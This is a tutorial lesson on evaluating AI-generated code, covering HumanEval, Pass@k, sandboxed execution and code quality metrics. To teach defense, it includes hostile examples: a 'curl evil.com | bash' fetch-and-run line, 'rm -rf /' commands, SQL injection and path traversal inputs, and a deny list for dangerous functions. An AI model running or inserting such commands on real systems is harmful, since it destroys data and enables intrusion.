# Lesson 10: Code Evaluation & Testing (Measuring Quality)

**Part B: Coding Models - Lesson 10 of 10**
**Difficulty:** Advanced
**Time Required:** 3-4 hours
**Prerequisites:** Lessons 6-9 (All coding lessons)

---

## Table of Contents

1. [Introduction](#introduction)
2. [The HumanEval Benchmark](#humaneval-benchmark)
3. [Pass@k Metrics](#passk-metrics)
4. [Automatic Test Generation](#automatic-test-generation)
5. [Sandbox Execution](#sandbox-execution)
6. [Code Quality Metrics](#code-quality-metrics)
7. [Security Considerations](#security-considerations)
8. [Quiz & Exercises](#quiz-exercises)
9. [Summary](#summary)

---

## Introduction

### Why Evaluate Generated Code?

**Problem:** How do we know if AI-generated code is good?

**Need to measure:**
1. **Correctness** - Does it work?
2. **Quality** - Is it well-written?
3. **Security** - Is it safe to run?
4. **Performance** - Is it efficient?

**C# Analogy:**
```csharp
// Like unit testing in .NET
[Test]
public void TestGeneratedCode()
{
    var result = GeneratedFunction(input);
    Assert.AreEqual(expected, result);
}
```

---

### Challenges in Code Evaluation

**1. Infinite Possible Solutions**
```python
# Problem: "Sum two numbers"

# Solution 1:
def add(a, b):
    return a + b

# Solution 2:
def add(a, b):
    return sum([a, b])

# Solution 3:
def add(a, b):
    result = a
    result += b
    return result

# All correct! Which is "best"?
```

**2. Execution Risks**
```python
# Generated code might be malicious!
def delete_all_files():
    import os
    os.system("rm -rf /")  # DANGEROUS!
```

**3. Ambiguous Specifications**
```
Task: "Write a function to sort a list"

Question:
- Sort in-place or return new list?
- Ascending or descending?
- What if list is empty?
- What if list contains None?
```

---

### Evaluation Approaches

**1. Unit Testing**
- Run against test cases
- Check if output matches expected

**2. Static Analysis**
- Parse code without running
- Check syntax, style, complexity

**3. Dynamic Analysis**
- Run code with instrumentation
- Measure performance, coverage

**4. Human Evaluation**
- Developers rate code quality
- Slow but accurate

**This lesson focuses on:**
- ✅ Unit testing with HumanEval
- ✅ Pass@k metrics
- ✅ Automated test generation
- ✅ Safe sandbox execution

---

## HumanEval Benchmark

### What is HumanEval?

**HumanEval** is the standard benchmark for evaluating code generation models.

**Created by:** OpenAI (2021)
**Used by:** Codex, AlphaCode, CodeGen, all major code models

**Structure:**
- 164 hand-written programming problems
- Each has:
  - Function signature
  - Docstring (specification)
  - Hidden test cases

**Example Problem:**

```python
def has_close_elements(numbers: List[float], threshold: float) -> bool:
    """
    Check if in given list of numbers, are any two numbers closer
    to each other than given threshold.

    >>> has_close_elements([1.0, 2.0, 3.0], 0.5)
    False
    >>> has_close_elements([1.0, 2.8, 3.0, 4.0, 5.0, 2.0], 0.3)
    True
    """
    # Model must generate this implementation
```

**Hidden Test Cases:**
```python
assert has_close_elements([1.0, 2.0, 3.9, 4.0, 5.0, 2.2], 0.3) == True
assert has_close_elements([1.0, 2.0, 3.9, 4.0, 5.0, 2.2], 0.05) == False
assert has_close_elements([1.0, 2.0, 5.9, 4.0, 5.0], 0.95) == True
# ... 10-20 more test cases
```

---

### HumanEval Format

**Each problem is a dictionary:**

```python
problem = {
    "task_id": "HumanEval/0",  # Unique ID

    "prompt": """
def has_close_elements(numbers: List[float], threshold: float) -> bool:
    \"\"\" Check if in given list of numbers, are any two numbers closer
    to each other than given threshold.
    >>> has_close_elements([1.0, 2.0, 3.0], 0.5)
    False
    >>> has_close_elements([1.0, 2.8, 3.0, 4.0, 5.0, 2.0], 0.3)
    True
    \"\"\"
""",

    "entry_point": "has_close_elements",  # Function name to test

    "canonical_solution": """
    for idx, elem in enumerate(numbers):
        for idx2, elem2 in enumerate(numbers):
            if idx != idx2:
                distance = abs(elem - elem2)
                if distance < threshold:
                    return True
    return False
""",

    "test": """
def check(candidate):
    assert candidate([1.0, 2.0, 3.9, 4.0, 5.0, 2.2], 0.3) == True
    assert candidate([1.0, 2.0, 3.9, 4.0, 5.0, 2.2], 0.05) == False
    assert candidate([1.0, 2.0, 5.9, 4.0, 5.0], 0.95) == True
    # ... more tests

check(has_close_elements)
"""
}
```

**Line-by-Line Explanation:**

- `task_id`: Unique identifier for this problem
  - Format: "HumanEval/{number}"

- `prompt`: What the model sees
  - Function signature + docstring
  - Model must complete the function

- `entry_point`: Function name to test
  - Used to extract the function from generated code

- `canonical_solution`: Reference implementation
  - What a human would write
  - Used for comparison (optional)

- `test`: Test suite
  - Hidden from model
  - Uses `check(candidate)` pattern
  - `candidate` is the generated function

---

### Using HumanEval

**Step 1: Load the dataset**

```python
import json

def load_humaneval(file_path="HumanEval.jsonl"):
    """
    Load HumanEval problems from JSONL file

    Args:
        file_path: Path to HumanEval.jsonl

    Returns:
        List of problem dictionaries
    """
    problems = []

    # JSONL = JSON Lines (one JSON per line)
    with open(file_path, 'r') as f:
        for line in f:
            # Parse each line as JSON
            problem = json.loads(line.strip())
            problems.append(problem)

    print(f"Loaded {len(problems)} problems")
    return problems

# Load dataset
problems = load_humaneval("HumanEval.jsonl")

# Example: First problem
print(problems[0]["prompt"])
```

**Step 2: Generate solutions**

```python
def generate_solutions(model, problems, num_samples=10):
    """
    Generate code for each problem

    Args:
        model: Code generation model
        problems: List of HumanEval problems
        num_samples: How many solutions per problem

    Returns:
        Dictionary mapping task_id → list of solutions
    """
    solutions = {}

    for problem in problems:
        task_id = problem["task_id"]
        prompt = problem["prompt"]

        # Generate multiple solutions (for Pass@k)
        task_solutions = []

        for i in range(num_samples):
            # Generate code
            completion = model.generate_code(
                prompt,
                max_length=300,
                temperature=0.8  # High temp for diversity
            )

            task_solutions.append(completion)

        solutions[task_id] = task_solutions

    return solutions
```

**Step 3: Test solutions**

```python
def evaluate_solution(problem, solution):
    """
    Test if solution passes all test cases

    Args:
        problem: HumanEval problem dict
        solution: Generated code string

    Returns:
        (passed, error_message)
            passed: True if all tests pass
            error_message: None if passed, error details otherwise
    """
    # Combine solution with test code
    # Need to define the function, then run tests
    full_code = solution + "\n\n" + problem["test"]

    # Execute in isolated namespace
    namespace = {}

    try:
        # Run the code
        # This defines the function AND runs the tests
        exec(full_code, namespace)

        # If we get here, all tests passed!
        return (True, None)

    except AssertionError as e:
        # Test failed
        return (False, f"Test failed: {e}")

    except Exception as e:
        # Runtime error (syntax, logic, etc.)
        return (False, f"Error: {e}")
```

**C# Comparison:**

```csharp
// In C#, would use reflection to run tests
public bool EvaluateSolution(string code, string testCode)
{
    // Compile code
    var compilation = CSharpCompilation.Create("Test")
        .AddReferences(...)
        .AddSyntaxTrees(CSharpSyntaxTree.ParseText(code));

    // Run tests using reflection
    var assembly = compilation.Emit(...);
    var testClass = assembly.GetType("TestClass");
    var testMethod = testClass.GetMethod("RunTests");

    return (bool)testMethod.Invoke(null, null);
}
```

---

## Pass@k Metrics

### What is Pass@k?

**Pass@k** measures: "If we generate k solutions, what's the probability that at least one passes?"

**Why it matters:**
- Single solution might fail due to randomness
- Multiple attempts increase success rate
- Reflects real usage (generate several, pick best)

---

### Mathematical Definition

**Pass@k** = Probability that at least 1 of k samples passes all tests

**Formula:**

```
Pass@k = 1 - (number of ways to pick k from (n-c)) / (number of ways to pick k from n)

Where:
  n = total samples generated
  c = number of correct samples
  k = number of samples to consider
```

**Simplified:**
```
Pass@k = 1 - (combinations(n-c, k) / combinations(n, k))
```

**Example:**
```
Generated 10 solutions (n=10)
3 are correct (c=3)
7 are wrong (n-c=7)

Pass@1 = 3/10 = 30%
  "If we pick 1 random solution, 30% chance it's correct"

Pass@3 = 1 - (combinations(7, 3) / combinations(10, 3))
       = 1 - (35 / 120)
       = 1 - 0.292
       = 0.708
       = 70.8%
  "If we pick 3 random solutions, 70.8% chance at least one is correct"

Pass@10 = 100%
  "If we use all 10, definitely get at least one correct"
```

---

### Computing Pass@k

**Implementation:**

```python
from itertools import combinations
import math

def pass_at_k(n: int, c: int, k: int) -> float:
    """
    Calculate Pass@k metric

    Args:
        n: Total number of samples
        c: Number of correct samples
        k: Number of samples to pick

    Returns:
        Probability (0.0 to 1.0)
    """
    # Edge cases
    if n - c < k:
        # Not enough wrong samples to avoid picking a correct one
        return 1.0

    if c == 0:
        # No correct samples
        return 0.0

    # Calculate combinations
    # C(n-c, k) = ways to pick k wrong samples
    # C(n, k) = ways to pick any k samples
    wrong_combinations = math.comb(n - c, k)
    total_combinations = math.comb(n, k)

    # Probability of picking all wrong
    prob_all_wrong = wrong_combinations / total_combinations

    # Pass@k = probability at least one is correct
    return 1.0 - prob_all_wrong


def evaluate_humaneval(solutions, problems):
    """
    Evaluate solutions on HumanEval using Pass@k

    Args:
        solutions: Dict[task_id -> List[code]]
        problems: List of HumanEval problems

    Returns:
        Dictionary with Pass@1, Pass@10, Pass@100 scores
    """
    results = {
        "total_problems": len(problems),
        "pass@1": [],
        "pass@10": [],
        "pass@100": []
    }

    for problem in problems:
        task_id = problem["task_id"]
        task_solutions = solutions.get(task_id, [])

        if not task_solutions:
            continue

        # Test each solution
        n = len(task_solutions)  # Total samples
        c = 0  # Correct samples

        for solution in task_solutions:
            passed, _ = evaluate_solution(problem, solution)
            if passed:
                c += 1

        # Calculate Pass@k for k=1, 10, 100
        if n >= 1:
            results["pass@1"].append(pass_at_k(n, c, k=1))

        if n >= 10:
            results["pass@10"].append(pass_at_k(n, c, k=10))

        if n >= 100:
            results["pass@100"].append(pass_at_k(n, c, k=100))

    # Average across all problems
    final_results = {
        "pass@1": sum(results["pass@1"]) / len(results["pass@1"]) if results["pass@1"] else 0,
        "pass@10": sum(results["pass@10"]) / len(results["pass@10"]) if results["pass@10"] else 0,
        "pass@100": sum(results["pass@100"]) / len(results["pass@100"]) if results["pass@100"] else 0,
    }

    return final_results
```

**Line-by-Line Explanation:**

- `math.comb(n, k)`: Calculate combinations (n choose k)
  - **C# Analogy:** No built-in, would need to implement using factorials

- `wrong_combinations / total_combinations`: Probability of picking all wrong
  - Example: If 7 wrong out of 10, and pick 3:
    - Ways to pick 3 wrong: C(7,3) = 35
    - Ways to pick any 3: C(10,3) = 120
    - Probability all wrong: 35/120 = 29.2%

- `1.0 - prob_all_wrong`: Probability at least one correct
  - If 29.2% chance all wrong, then 70.8% chance at least one right

---

### Interpreting Pass@k Scores

**Typical Results:**

| Model | Pass@1 | Pass@10 | Pass@100 |
|-------|--------|---------|----------|
| Random Code | 0% | 0% | 0% |
| Basic Model | 5% | 15% | 30% |
| GPT-3 (Codex) | 28% | 47% | 72% |
| GPT-4 | 67% | 82% | 90% |
| Human Expert | 95% | 100% | 100% |

**What this means:**

- **Pass@1 = 28%**: If Codex generates 1 solution, 28% chance it's correct
  - Still better than most developers on first try!

- **Pass@10 = 47%**: If Codex generates 10 solutions, 47% chance at least one works
  - GitHub Copilot shows multiple suggestions for this reason

- **Pass@100 = 72%**: Generate 100, at least one works 72% of the time
  - Useful for automated testing/fixing

**C# Developer Insight:**
```csharp
// Like Resharper showing multiple refactoring options
// Pick the best one from several suggestions
var suggestions = copilot.Generate(count: 10);
var best = suggestions.OrderByDescending(s => s.Score).First();
```

---

## Automatic Test Generation

### Why Generate Tests?

**Problem:** Testing generated code requires tests

**Chicken-and-egg:**
1. Generate code from specification
2. Need tests to verify code
3. But writing tests is tedious!

**Solution:** Auto-generate tests from specification

---

### Approaches to Test Generation

**1. Example-Based**
Extract examples from docstring

```python
def fibonacci(n):
    """
    Calculate nth Fibonacci number.

    >>> fibonacci(0)
    0
    >>> fibonacci(1)
    1
    >>> fibonacci(5)
    5
    >>> fibonacci(10)
    55
    """
    # Implementation here
```

Extract tests:
```python
assert fibonacci(0) == 0
assert fibonacci(1) == 1
assert fibonacci(5) == 5
assert fibonacci(10) == 55
```

**2. Property-Based**
Generate inputs, check properties

```python
# Property: fibonacci(n) should increase with n
for i in range(1, 100):
    assert fibonacci(i) >= fibonacci(i-1)

# Property: fibonacci(n+2) = fibonacci(n+1) + fibonacci(n)
for i in range(100):
    assert fibonacci(i+2) == fibonacci(i+1) + fibonacci(i)
```

**3. Mutation-Based**
Modify inputs systematically

```python
# Test with edge cases
test_inputs = [
    0,           # Minimum
    1,           # Base case
    10,          # Normal
    100,         # Large
    -1,          # Invalid (should raise error)
]
```

---

### Example-Based Test Extraction

**Implementation:**

```python
import doctest
import re

class TestExtractor:
    """
    Extracts test cases from docstrings
    Uses doctest format: >>> code
    """

    def extract_from_docstring(self, code: str) -> List[Tuple[str, str]]:
        """
        Extract test cases from docstring examples

        Args:
            code: Function code with docstring

        Returns:
            List of (input_code, expected_output) tuples
        """
        # Parse code to get docstring
        try:
            tree = ast.parse(code)
        except:
            return []

        # Find first function
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                docstring = ast.get_docstring(node)
                if docstring:
                    return self._parse_doctest(docstring)

        return []

    def _parse_doctest(self, docstring: str) -> List[Tuple[str, str]]:
        """
        Parse doctest examples from docstring

        Format:
            >>> function_call(args)
            expected_output
        """
        tests = []
        lines = docstring.split('\n')

        i = 0
        while i < len(lines):
            line = lines[i].strip()

            # Find doctest example (starts with >>>)
            if line.startswith('>>>'):
                # Extract code (remove >>>)
                code = line[3:].strip()

                # Next line is expected output
                if i + 1 < len(lines):
                    expected = lines[i + 1].strip()

                    tests.append((code, expected))

                i += 2
            else:
                i += 1

        return tests

    def generate_test_code(self, function_name: str, tests: List[Tuple[str, str]]) -> str:
        """
        Generate test function from extracted tests

        Args:
            function_name: Name of function to test
            tests: List of (input, output) tuples

        Returns:
            Test function code
        """
        test_code = f"def test_{function_name}():\n"

        for input_code, expected in tests:
            # Generate assertion
            test_code += f"    assert {input_code} == {expected}\n"

        return test_code
```

**Example Usage:**

```python
code = '''
def add(a, b):
    """
    Add two numbers.

    >>> add(2, 3)
    5
    >>> add(-1, 1)
    0
    >>> add(0, 0)
    0
    """
    return a + b
'''

extractor = TestExtractor()
tests = extractor.extract_from_docstring(code)

print("Extracted tests:")
for input_code, expected in tests:
    print(f"  {input_code} → {expected}")

test_code = extractor.generate_test_code("add", tests)
print("\nGenerated test:")
print(test_code)
```

**Output:**
```python
Extracted tests:
  add(2, 3) → 5
  add(-1, 1) → 0
  add(0, 0) → 0

Generated test:
def test_add():
    assert add(2, 3) == 5
    assert add(-1, 1) == 0
    assert add(0, 0) == 0
```

---

## Sandbox Execution

### The Security Problem

**Danger:** Running untrusted code can:
- Delete files
- Access network
- Steal data
- Install malware
- Crash system

**Example Malicious Code:**

```python
# Looks innocent but...
def calculate_sum(numbers):
    """Sum a list of numbers."""
    import os
    os.system("curl http://evil.com/steal_data.sh | bash")  # Malicious!
    return sum(numbers)
```

---

### Sandboxing Approaches

**1. Separate Process**
- Run in isolated process
- Kill if timeout/crash
- Limited permissions

**2. Docker Container**
- Full OS isolation
- Restricted resources
- Network isolation

**3. Virtual Machine**
- Strongest isolation
- Slow startup
- Resource intensive

**4. Python-Specific: RestrictedPython**
- Limit Python features
- Block dangerous imports
- Custom builtins

---

### Simple Sandbox Implementation

**Using subprocess with timeout:**

```python
import subprocess
import tempfile
import os

class SimpleSandbox:
    """
    Run Python code in isolated subprocess
    Prevents most malicious actions

    Like: Running tests in separate AppDomain in .NET
    """

    def __init__(self, timeout=5):
        """
        Args:
            timeout: Max execution time in seconds
        """
        self.timeout = timeout

    def execute(self, code: str, test_code: str) -> Tuple[bool, str]:
        """
        Execute code with tests in sandbox

        Args:
            code: Function implementation
            test_code: Test code to run

        Returns:
            (success, output_or_error)
        """
        # Write code to temporary file
        # Use temp file so code runs in isolation
        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix='.py',
            delete=False
        ) as f:
            # Write complete program
            f.write(code)
            f.write('\n\n')
            f.write(test_code)
            temp_file = f.name

        try:
            # Run in separate process
            # capture_output=True: Capture stdout/stderr
            # timeout: Kill if takes too long
            result = subprocess.run(
                ['python', temp_file],
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            # Check if successful
            if result.returncode == 0:
                # Success!
                return (True, result.stdout)
            else:
                # Failed (test failed or runtime error)
                return (False, result.stderr)

        except subprocess.TimeoutExpired:
            # Code took too long (infinite loop?)
            return (False, f"Timeout after {self.timeout} seconds")

        except Exception as e:
            return (False, f"Execution error: {e}")

        finally:
            # Clean up temp file
            try:
                os.unlink(temp_file)
            except:
                pass
```

**Line-by-Line Explanation:**

- `tempfile.NamedTemporaryFile()`: Create temp file
  - **C# Analogy:** `Path.GetTempFileName()`
  - Why: Don't pollute filesystem with test files

- `delete=False`: Don't auto-delete (we'll delete manually)
  - Need file to exist when subprocess runs

- `subprocess.run()`: Run command in new process
  - **C# Analogy:** `Process.Start()` in System.Diagnostics
  - Isolated from main process

- `capture_output=True`: Capture stdout and stderr
  - Get results without printing to console

- `timeout=self.timeout`: Kill if exceeds time limit
  - Prevents infinite loops
  - Prevents DoS attacks

- `result.returncode`: Exit code (0 = success)
  - **C# Analogy:** `Process.ExitCode`

---

### Docker-Based Sandbox (Production Grade)

**For production, use Docker:**

```python
import docker

class DockerSandbox:
    """
    Run code in Docker container
    Strong isolation, used in production

    Like: Azure Container Instances for isolated execution
    """

    def __init__(self, image="python:3.10-slim", timeout=10):
        """
        Args:
            image: Docker image to use
            timeout: Max execution time
        """
        self.client = docker.from_env()
        self.image = image
        self.timeout = timeout

    def execute(self, code: str, test_code: str) -> Tuple[bool, str]:
        """
        Execute in Docker container

        Args:
            code: Function code
            test_code: Test code

        Returns:
            (success, output)
        """
        # Combine code
        full_code = code + '\n\n' + test_code

        try:
            # Run in container
            # remove=True: Delete container after run
            # mem_limit: Limit memory to 128MB
            # network_disabled: No network access
            output = self.client.containers.run(
                image=self.image,
                command=['python', '-c', full_code],
                remove=True,
                mem_limit='128m',
                network_disabled=True,
                timeout=self.timeout
            )

            # Decode output
            return (True, output.decode('utf-8'))

        except docker.errors.ContainerError as e:
            # Container exited with error
            return (False, e.stderr.decode('utf-8'))

        except Exception as e:
            return (False, str(e))
```

**Why Docker is better:**
- ✅ Can't access host filesystem
- ✅ Can't access network (unless allowed)
- ✅ Memory limits prevent DoS
- ✅ Easy to reset (just restart container)

**C# Comparison:**
```csharp
// In .NET, would use AppDomain (older) or AssemblyLoadContext (newer)
var domain = AppDomain.CreateDomain("Sandbox");
try
{
    domain.ExecuteAssembly("UntrustedCode.exe");
}
finally
{
    AppDomain.Unload(domain);
}
```

---

## Code Quality Metrics

### Beyond Correctness

**Functional Correctness:** Does it work?
**Code Quality:** Is it well-written?

**Quality Dimensions:**

1. **Readability** - Easy to understand?
2. **Efficiency** - Fast and memory-efficient?
3. **Maintainability** - Easy to modify?
4. **Robustness** - Handles edge cases?
5. **Style** - Follows conventions?

---

### Measuring Code Quality

**1. Cyclomatic Complexity**
Measures code complexity (number of paths)

```python
def simple(x):
    return x + 1
# Complexity: 1 (one path)

def complex(x):
    if x < 0:
        return -x
    elif x == 0:
        return 0
    else:
        return x * 2
# Complexity: 3 (three paths)
```

**Rule of thumb:**
- 1-10: Simple, good
- 11-20: Moderate, acceptable
- 21+: Complex, refactor!

**2. Lines of Code (LOC)**
Shorter is often better

```python
# Bad: 5 lines
def sum_list(items):
    total = 0
    for item in items:
        total += item
    return total

# Good: 1 line
def sum_list(items):
    return sum(items)
```

**3. Code Duplication**
Repeated code is a smell

**4. Type Coverage**
How many functions have type hints?

```python
# No types (bad)
def add(a, b):
    return a + b

# With types (good)
def add(a: int, b: int) -> int:
    return a + b
```

---

### Implementing Quality Checker

```python
class CodeQualityChecker:
    """
    Analyzes code quality metrics
    Goes beyond just "does it work?"
    """

    def analyze(self, code: str) -> Dict:
        """
        Analyze code quality

        Args:
            code: Python code to analyze

        Returns:
            Dictionary of metrics
        """
        metrics = {
            "lines_of_code": 0,
            "cyclomatic_complexity": 0,
            "has_docstring": False,
            "has_type_hints": False,
            "num_functions": 0,
            "num_comments": 0,
        }

        try:
            tree = ast.parse(code)
        except:
            return metrics

        # Count lines (non-empty, non-comment)
        lines = [l for l in code.split('\n') if l.strip() and not l.strip().startswith('#')]
        metrics["lines_of_code"] = len(lines)

        # Count comments
        metrics["num_comments"] = len([l for l in code.split('\n') if l.strip().startswith('#')])

        # Analyze functions
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                metrics["num_functions"] += 1

                # Check for docstring
                if ast.get_docstring(node):
                    metrics["has_docstring"] = True

                # Check for type hints
                if node.returns or any(arg.annotation for arg in node.args.args):
                    metrics["has_type_hints"] = True

                # Calculate complexity
                complexity = self._calculate_complexity(node)
                metrics["cyclomatic_complexity"] = max(
                    metrics["cyclomatic_complexity"],
                    complexity
                )

        return metrics

    def _calculate_complexity(self, node: ast.FunctionDef) -> int:
        """
        Calculate cyclomatic complexity
        Counts decision points in code
        """
        complexity = 1  # Base complexity

        # Count decision points
        for child in ast.walk(node):
            # Each if, for, while, and, or adds complexity
            if isinstance(child, (ast.If, ast.While, ast.For)):
                complexity += 1
            elif isinstance(child, ast.BoolOp):
                # and/or operators
                complexity += len(child.values) - 1

        return complexity

    def score(self, metrics: Dict) -> float:
        """
        Calculate overall quality score (0-100)

        Args:
            metrics: Metrics from analyze()

        Returns:
            Score from 0 to 100
        """
        score = 100.0

        # Penalize high complexity
        if metrics["cyclomatic_complexity"] > 10:
            score -= 20
        elif metrics["cyclomatic_complexity"] > 5:
            score -= 10

        # Reward docstring
        if metrics["has_docstring"]:
            score += 10
        else:
            score -= 15

        # Reward type hints
        if metrics["has_type_hints"]:
            score += 10
        else:
            score -= 10

        # Penalize very long code
        if metrics["lines_of_code"] > 50:
            score -= 10

        # Reward comments
        if metrics["num_comments"] > 0:
            score += 5

        # Clamp to 0-100
        return max(0, min(100, score))
```

**Example:**

```python
checker = CodeQualityChecker()

# Good code
good_code = '''
def factorial(n: int) -> int:
    """Calculate factorial of n."""
    if n <= 1:
        return 1
    return n * factorial(n - 1)
'''

# Bad code
bad_code = '''
def f(x):
    if x<0:
        if x<-10:
            if x<-100:
                return 1
            else:
                return 2
        else:
            return 3
    else:
        if x>10:
            return 4
        else:
            return 5
'''

print("Good code metrics:")
good_metrics = checker.analyze(good_code)
print(good_metrics)
print(f"Score: {checker.score(good_metrics)}/100")

print("\nBad code metrics:")
bad_metrics = checker.analyze(bad_code)
print(bad_metrics)
print(f"Score: {checker.score(bad_metrics)}/100")
```

---

## Security Considerations

### Common Vulnerabilities in Generated Code

**1. Command Injection**
```python
# DANGEROUS!
def run_command(user_input):
    os.system(f"echo {user_input}")  # User can inject commands!

# User input: "; rm -rf /"
# Executed: "echo ; rm -rf /"  ← Deletes everything!
```

**Fix:**
```python
# SAFE
import subprocess
def run_command(user_input):
    subprocess.run(["echo", user_input])  # Properly escaped
```

**2. SQL Injection**
```python
# DANGEROUS!
def get_user(username):
    query = f"SELECT * FROM users WHERE name = '{username}'"
    return db.execute(query)

# username = "admin' OR '1'='1"
# query = "SELECT * FROM users WHERE name = 'admin' OR '1'='1'"
# Returns ALL users!
```

**Fix:**
```python
# SAFE
def get_user(username):
    query = "SELECT * FROM users WHERE name = ?"
    return db.execute(query, (username,))  # Parameterized query
```

**3. Path Traversal**
```python
# DANGEROUS!
def read_file(filename):
    with open(filename) as f:
        return f.read()

# filename = "../../etc/passwd"
# Reads system password file!
```

**Fix:**
```python
# SAFE
import os
def read_file(filename):
    # Ensure file is in allowed directory
    base_dir = "/safe/directory"
    path = os.path.join(base_dir, filename)
    path = os.path.abspath(path)

    if not path.startswith(base_dir):
        raise ValueError("Invalid path")

    with open(path) as f:
        return f.read()
```

---

### Static Security Analysis

```python
class SecurityChecker:
    """
    Checks generated code for security vulnerabilities
    Prevents dangerous code from running
    """

    DANGEROUS_IMPORTS = {
        'os.system',
        'subprocess.Popen',
        'eval',
        'exec',
        '__import__',
    }

    DANGEROUS_FUNCTIONS = {
        'eval', 'exec', 'compile',
        'open',  # Can read sensitive files
        '__import__',
    }

    def check(self, code: str) -> Tuple[bool, List[str]]:
        """
        Check code for security issues

        Args:
            code: Python code

        Returns:
            (is_safe, list_of_issues)
        """
        issues = []

        # Check for dangerous imports
        if re.search(r'import\s+os', code):
            if re.search(r'os\.system', code):
                issues.append("Uses os.system - command injection risk")

        if re.search(r'import\s+subprocess', code):
            if 'shell=True' in code:
                issues.append("Uses shell=True - command injection risk")

        # Check for eval/exec
        if re.search(r'\beval\s*\(', code):
            issues.append("Uses eval() - code injection risk")

        if re.search(r'\bexec\s*\(', code):
            issues.append("Uses exec() - code injection risk")

        # Check for file operations
        if re.search(r'\bopen\s*\(', code):
            issues.append("Uses open() - file access (ensure path validation)")

        # Check for SQL (simplified)
        if re.search(r'f["\']SELECT.*FROM', code):
            issues.append("Uses f-string in SQL - SQL injection risk")

        is_safe = len(issues) == 0
        return (is_safe, issues)
```

---

## Quiz & Exercises

### Quiz Questions

**Question 1: Pass@k Interpretation**

You generate 20 solutions, 5 are correct. What is Pass@1?

A) 5%
B) 20%
C) 25%
D) 50%

<details>
<summary>Answer</summary>

**C) 25%**

**Calculation:**
```
Pass@1 = c/n = 5/20 = 0.25 = 25%
```

If you randomly pick 1 solution from 20, you have a 5/20 = 25% chance it's correct.

</details>

---

**Question 2: HumanEval Format**

What does the model see when solving a HumanEval problem?

A) Prompt only (signature + docstring)
B) Prompt + test cases
C) Prompt + canonical solution
D) Everything

<details>
<summary>Answer</summary>

**A) Prompt only**

The model only sees:
- Function signature
- Docstring with description
- Maybe example inputs/outputs in docstring

It does NOT see:
- Test cases (hidden)
- Canonical solution (hidden)

This simulates real coding: You read requirements, write code, don't know tests in advance.

</details>

---

**Question 3: Sandbox Security**

Which is the STRONGEST isolation for running untrusted code?

A) Same process with restricted imports
B) Separate subprocess
C) Docker container
D) Virtual machine

<details>
<summary>Answer</summary>

**D) Virtual machine**

**Isolation levels (weakest → strongest):**

1. **Same process** (RestrictedPython)
   - Can escape with clever tricks
   - Still shares memory

2. **Separate subprocess**
   - Better, but shares OS
   - Can still access files

3. **Docker container**
   - OS-level isolation
   - Restricted resources
   - Production-grade for most uses

4. **Virtual machine**
   - Complete OS isolation
   - Hypervisor separation
   - Slowest but safest

**For code evaluation:** Docker is usually the best tradeoff (secure + fast enough).

</details>

---

## Summary

### Key Takeaways

1. **HumanEval is the Standard Benchmark**
   - 164 hand-written problems
   - Tests functional correctness
   - Used by all major code models

2. **Pass@k Measures Success Rate**
   - Pass@1: Single attempt success rate
   - Pass@10: Success with 10 attempts
   - Higher k = higher success rate

3. **Automatic Test Generation**
   - Extract from docstrings (doctest)
   - Property-based testing
   - Mutation testing

4. **Sandbox Execution is Critical**
   - Never run untrusted code directly!
   - Use subprocess, Docker, or VM
   - Timeout to prevent infinite loops

5. **Quality Beyond Correctness**
   - Cyclomatic complexity
   - Code style
   - Documentation
   - Type hints

6. **Security is Paramount**
   - Command injection
   - SQL injection
   - Path traversal
   - Static analysis to catch issues

---

### C#/.NET Comparisons

| Python/HumanEval | C#/.NET Equivalent |
|---|---|
| HumanEval | LeetCode, HackerRank |
| Pass@k | Test success rate |
| Sandbox (subprocess) | AppDomain, AssemblyLoadContext |
| Sandbox (Docker) | Container Instances |
| AST analysis | Roslyn analyzers |
| Static security | Security Code Scan |

---

### What You've Learned

After this lesson, you can:

- ✅ Use HumanEval to evaluate code models
- ✅ Calculate and interpret Pass@k metrics
- ✅ Generate tests automatically
- ✅ Run code safely in sandbox
- ✅ Measure code quality
- ✅ Detect security vulnerabilities

---

### Module 7 Complete! 🎉

**You've completed all 10 lessons:**

**Part A: Reasoning Models (5 lessons)**
1. Chain-of-Thought
2. Self-Consistency
3. Tree-of-Thoughts
4. Process Supervision
5. Building o1-style Systems

**Part B: Coding Models (5 lessons)**
6. Code Tokenization
7. Code Embeddings
8. Training on Code
9. Code Generation
10. Code Evaluation ← You are here!

**Congratulations!** You now understand both reasoning and coding models at a deep level!

---

### Next Steps

**1. Build Capstone Projects:**
   - Mini-Copilot with evaluation
   - Code review system
   - Automatic test generator
   - Bug detection tool

**2. Explore Advanced Topics:**
   - Multi-language support
   - Code translation
   - Program synthesis
   - Formal verification

**3. Stay Current:**
   - New models (GPT-5, Gemini 2.0)
   - New benchmarks (APPS, MBPP)
   - Research papers

---

**Module 7 Progress:** 100% (10/10 lessons complete) 🎉

**Total Content:** ~20,000 lines of lessons + examples!

**You're now an expert in advanced LLMs!** 🚀

---

**Created:** March 17, 2026
**Author:** Learn LLM from Scratch Project
**For:** .NET Developers Learning AI
